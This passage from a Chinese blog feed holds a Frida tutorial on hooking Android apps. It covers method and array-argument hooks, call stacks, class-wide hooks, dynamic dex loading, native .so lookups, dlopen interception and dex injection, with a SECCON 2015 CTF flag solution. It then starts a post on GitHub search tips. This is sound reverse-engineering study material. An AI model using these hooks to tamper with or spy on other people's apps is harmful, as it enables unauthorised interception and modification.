<h3 id="Hook-参数为数组的方法"><a href="#Hook-参数为数组的方法" class="headerlink" title="Hook 参数为数组的方法"></a>Hook 参数为数组的方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook 参数为数组</span></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity$innerClass&quot;</span>);</span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">printArray</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[Lcom.example.android.MainActivity$innerClass;&#x27;</span>)</span><br><span class="line">            .<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arr: any</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> arr)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(i.<span class="title function_">getNum</span>())</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 修改参数</span></span><br><span class="line">            <span class="keyword">let</span> a = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Lcom.example.android.MainActivity$innerClass;&quot;</span>,</span><br><span class="line">    [innerClass.$new(<span class="variable language_">this</span>, <span class="number">111</span>), innerClass.$new(<span class="variable language_">this</span>, <span class="number">222</span>), innerClass.$new(<span class="variable language_">this</span>, <span class="number">333</span>)]);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">printArray</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="打印调用栈"><a href="#打印调用栈" class="headerlink" title="打印调用栈"></a>打印调用栈</h3><p>在逆向中我们可以通过打印调用栈获取关键方法的调用关系。相关代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stackTraceHere</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Exception&#x27;</span>).$new());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity&quot;</span>);</span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">add</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a:number, b:number</span>) &#123;</span><br><span class="line">            <span class="comment">// 打印堆栈信息</span></span><br><span class="line">            <span class="keyword">let</span> stack = <span class="title function_">stackTraceHere</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(stack);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">add</span>(a, b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-指定类的所有方法"><a href="#Hook-指定类的所有方法" class="headerlink" title="Hook 指定类的所有方法"></a>Hook 指定类的所有方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 枚举所有的类</span></span><br><span class="line">        <span class="keyword">let</span> classList = <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> className <span class="keyword">of</span> classList)&#123;</span><br><span class="line">            <span class="comment">// 2. 选择需要 Hook 的类</span></span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">indexOf</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// 3. 获取该类的所有方法</span></span><br><span class="line">                <span class="keyword">let</span> declaredMethods = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;---------------------------&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> method <span class="keyword">of</span> declaredMethods)&#123;</span><br><span class="line">                    <span class="comment">// 4. 获取函数名</span></span><br><span class="line">                    <span class="keyword">let</span> methodName = method.<span class="title function_">getName</span>();</span><br><span class="line">                    <span class="keyword">let</span> hookClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                    <span class="comment">// 5. 开始 hook</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> overloads_md <span class="keyword">of</span> hookClass[methodName].<span class="property">overloads</span>)&#123;</span><br><span class="line">                        overloads_md.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> arg <span class="keyword">of</span> <span class="variable language_">arguments</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;methodName&#125;</span> -&gt; argType: [<span class="subst">$&#123;<span class="keyword">typeof</span> arg&#125;</span>] ;argValue: [<span class="subst">$&#123;arg&#125;</span>] .`</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;============================&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-动态加载的-dex"><a href="#Hook-动态加载的-dex" class="headerlink" title="Hook 动态加载的 dex"></a>Hook 动态加载的 dex</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Java.classFactory.loader :<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(Java.classFactory.loader)&#125;</span>`</span>);</span><br><span class="line">                <span class="comment">// 获取动态加载的类</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> className = <span class="string">&quot;com.example.Dynamic.Fibonacci&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (loader.<span class="title function_">loadClass</span>(className)) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader;</span><br><span class="line">                        <span class="keyword">let</span> <span class="title class_">Fibonacci</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                        <span class="comment">// 调用 dex 中的方法</span></span><br><span class="line">                        <span class="keyword">let</span> ret = <span class="title class_">Fibonacci</span>.<span class="title function_">fibonacci</span>(<span class="number">20</span>);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ret: &quot;</span> + ret);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                     <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onComplete!!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-打印-non-ascii-和特殊字符"><a href="#Hook-打印-non-ascii-和特殊字符" class="headerlink" title="Hook 打印 non-ascii 和特殊字符"></a>Hook 打印 non-ascii 和特殊字符</h3><p>一些特殊字符和不可见字符, 可以先通过编码再解码的方式进行 hook 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ֏(<span class="type">int</span> x) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>针对上面的 <code>֏</code> , 直接用 <code>js</code> 编码, 在通过类名 <code>[js解码的方法名]</code> 进行 <code>implementation</code> 。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> targetClass = <span class="string">&quot;com.example.hooktest.MainActivity&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> hookCls = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">            <span class="keyword">var</span> methods = hookCls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> methods) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i].<span class="title function_">toString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(methods[i].<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/^.*?\.([^\s\.\(\)]+)\(.*?$/</span>, <span class="string">&quot;$1&quot;</span>)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hookCls[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)]</span><br><span class="line">                .<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;original call: fun(&quot;</span> + x + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)](<span class="number">900</span>);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<h3 id="write-ups-2015"><a href="#write-ups-2015" class="headerlink" title="write-ups-2015"></a>write-ups-2015</h3><p>首先我们根据 Frida 官网给的<a href="https://github.com/ctfs/write-ups-2015/tree/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1">测试用例</a>简单的熟悉一下 Frida 的使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 获取需要 hook 方法的类</span></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>);</span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">onClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v:any</span>) &#123;</span><br><span class="line">            <span class="comment">// 调用原始函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">onClick</span>(v)</span><br><span class="line">            <span class="comment">// 原始函数调用完成后，修改相应的变量</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">m</span>.<span class="property">value</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">n</span>.<span class="property">value</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cnt</span>.<span class="property">value</span> = <span class="number">999</span>;</span><br><span class="line">            <span class="comment">// 主动调用获取 flag</span></span><br><span class="line">            <span class="keyword">let</span> flag = <span class="string">`SECCON&#123;<span class="subst">$&#123;(<span class="number">1000</span> + <span class="variable language_">this</span>.calc()) *<span class="number">107</span>&#125;</span>&#125;`</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span> + flag)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">TextView</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>);</span><br><span class="line">        <span class="title class_">TextView</span>.<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str:string</span>) &#123;</span><br><span class="line">            <span class="comment">// 通过 setText 获取 flag</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="title function_">getId</span>().<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">toUpperCase</span>() == <span class="string">&quot;7F0C0052&quot;</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;setText : &quot;</span> + str)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">setText</span>(str)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h1 id="Frida-Hook-so"><a href="#Frida-Hook-so" class="headerlink" title="Frida Hook so"></a>Frida Hook so</h1><h2 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="Process-enumerateModules"><a href="#Process-enumerateModules" class="headerlink" title="Process.enumerateModules"></a>Process.enumerateModules</h3><p>用于查看目标 module 是否被正常加载, 使用 <code>Process.enumerateModules()</code> 将当前加载的所有 so 文件打印出来。</p>
<p>使用方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> <span class="variable language_">module</span> <span class="keyword">of</span> modules)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">module</span>.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;libcalc.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`module name: <span class="subst">$&#123;<span class="variable language_">module</span>.name&#125;</span> ; base: <span class="subst">$&#123;<span class="variable language_">module</span>.base&#125;</span> ; path:<span class="subst">$&#123;<span class="variable language_">module</span>.path&#125;</span>`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Module-findBaseAddress"><a href="#Module-findBaseAddress" class="headerlink" title="Module.findBaseAddress"></a>Module.findBaseAddress</h3><p>获取指定 so 文件的基地址。 </p>
<p>使用方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> baseAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libcalc.so&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libcalc.so baseAddr: &quot;</span>, baseAddr);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Module-findExportByName"><a href="#Module-findExportByName" class="headerlink" title="Module.findExportByName"></a>Module.findExportByName</h3><p>通过导出函数名获取对应的地址。</p>
<p>使用方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> calc = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;calc addr: &quot;</span>, calc);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="Frida-代码片段"><a href="#Frida-代码片段" class="headerlink" title="Frida 代码片段"></a>Frida 代码片段</h1><p>Hook StringBuilder and print data only from a specific class</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sbActivate = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">StringBuilder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.StringBuilder&#x27;</span>);</span><br><span class="line">  <span class="title class_">StringBuilder</span>.<span class="property">toString</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> res = <span class="variable language_">this</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">if</span> (sbActivate) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (res !== <span class="literal">null</span>) &#123;</span><br><span class="line">          tmp = res.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="string">&quot;/n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> someclass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;&lt;the specific class you are interested in&gt;&#x27;</span>);</span><br><span class="line">  someclass.<span class="property">someMethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    sbActivate = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="variable language_">this</span>.<span class="title function_">someMethod</span>();</span><br><span class="line">    sbActivate = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>byte[]这种 hook输出的时候该怎么写呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> j = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.business.comm.j&quot;</span>);</span><br><span class="line">j.<span class="property">x</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>.<span class="title function_">x</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;j.x:&quot;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(result).<span class="title function_">hex</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">j.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">bArr</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">a</span>(bArr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;j.a:&quot;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(bArr).<span class="title function_">hex</span>());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>hook Androd 7以上的 dlopen 。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line"><span class="keyword">if</span> (android_dlopen_ext != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">            <span class="keyword">if</span> (soName.<span class="title function_">indexOf</span>(<span class="string">&quot;**.so&quot;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------load **----------&quot;</span>)</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hook</span>) &#123;</span><br><span class="line">                <span class="comment">//TODO hookso</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>frida如何注入dex？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(dexPath).<span class="title function_">load</span>();</span><br></pre></td></tr></table></figure>

<p>在系统里装上这个这个npm包，可以在任意工程获得frida的代码提示、补全和API查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g @types/frida-gum</span><br></pre></td></tr></table></figure>

<p>参考:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://kevinspider.github.io/fridahookjava/</span><br><span class="line">https://zyzling.gitee.io/2020/05/12/Frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>frida</category>
      </categories>
      <tags>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>github项目搜索技巧</title>
    <url>/2020/03/05/github%E9%A1%B9%E7%9B%AE%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#github-%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7">github 搜索技巧</a><ul>
<li><a href="#%E6%A1%88%E4%BE%8B">案例</a><ul>
<li><a href="#%E6%99%AE%E9%80%9A%E6%90%9C">普通搜</a></li>
</ul>
</li>
<li><a href="#%E6%90%AD%E9%85%8D%E6%8A%80%E5%B7%A7%E6%90%9C">搭配技巧搜</a></li>
<li><a href="#%E9%99%90%E5%AE%9A%E8%AF%8D">限定词</a><ul>
<li><a href="#%E6%9F%A5%E6%89%BE%E6%9F%90%E4%B8%AA%E7%94%A8%E6%88%B7%E6%88%96%E7%BB%84%E7%BB%87%E7%9A%84%E9%A1%B9%E7%9B%AE">查找某个用户或组织的项目</a></li>
</ul>
</li>
<li><a href="#%E8%BE%85%E5%8A%A9%E9%99%90%E5%AE%9A%E8%AF%8D">辅助限定词</a></li>
<li><a href="#%E8%BF%98%E6%B2%A1%E6%90%9E%E6%87%82%E7%9A%84%E5%85%B3%E4%BA%8E-forksmirrorissues">还没搞懂的（关于 forks、mirror、issues）</a></li>
<li><a href="#%E6%8E%92%E5%BA%8F%E6%94%BE%E7%9A%84%E6%98%AF%E5%AE%98%E7%BD%91%E7%9A%84%E9%93%BE%E6%8E%A5">排序（放的是官网的链接）</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97">使用指南</a><ul>
<li><a href="#%E7%BB%83%E4%B9%A0%E6%A1%88%E4%BE%8B">练习案例</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->

<h1 id="github-搜索技巧"><a href="#github-搜索技巧" class="headerlink" title="github 搜索技巧"></a>github 搜索技巧</h1><p>参考自 B站 up 主 CodeSheep 的视频【<a href="https://www.bilibili.com/video/av75587104">如何高效地在网上找开源项目做！在职程序员实际演示一波视频教程操作</a>】，然后写着写着一好奇就去看文档了</p>
<p>现在这篇博客相当于官方文档的翻译版😂</p>
<p>当然，你也可以去看【<a href="https://help.github.com/en/github/searching-for-information-on-github/searching-on-github">官方文档</a>】体验原汁原味的教程</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="普通搜"><a href="#普通搜" class="headerlink" title="普通搜"></a>普通搜</h3><p>关键词：<code>python</code></p>
<img src="/2020/03/05/github%E9%A1%B9%E7%9B%AE%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/2020-03-05-21-48-14.png" class="">

<h2 id="搭配技巧搜"><a href="#搭配技巧搜" class="headerlink" title="搭配技巧搜"></a>搭配技巧搜</h2><p>搜索 github 中，项目描述（description）中有 python 并且 2019-12-20 号之后有更新过的项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:description python pushed:&gt;2019-12-20</span><br></pre></td></tr></table></figure>
<p>效果：加了限制条件后，查出来的项目数有了明显的减少</p>
<img src="/2020/03/05/github%E9%A1%B9%E7%9B%AE%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/2020-03-05-21-49-11.png" class="">

